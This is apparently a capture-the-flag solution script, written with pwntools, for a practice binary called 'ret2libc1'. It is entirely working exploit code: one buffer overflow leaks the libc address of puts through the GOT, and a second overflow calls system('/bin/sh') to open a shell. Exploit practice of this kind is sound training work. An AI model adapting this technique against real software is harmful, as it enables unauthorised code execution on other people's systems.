from pwn import *
Lib = ELF('/lib/i386-linux-gnu/libc.so.6')
#context.log_level = 'debug'
io = process('./ret2libc1')
#io = gdb.debug('./ret2libc1')
elf = ELF('./ret2libc1')
payload = b'A'*(112)+p32(elf.plt['puts'])+p32(elf.sym['main'])+p32(elf.got['puts'])
io.sendlineafter(b'RET2LIBC >_<\n',payload)
puts_addr = u32(io.recv(4))
print('puts_addr->{}'.format(hex(puts_addr)))

liboffset = puts_addr - Lib.sym['puts']
sys_addr = liboffset + Lib.sym['system']
bin_sh_addr = liboffset + next(Lib.search(b'/bin/sh'))

payload = b'A'*(100+4)+p32(sys_addr)+p32(0)+p32(bin_sh_addr)
io.sendlineafter(b'RET2LIBC >_<\n',payload)
io.interactive()
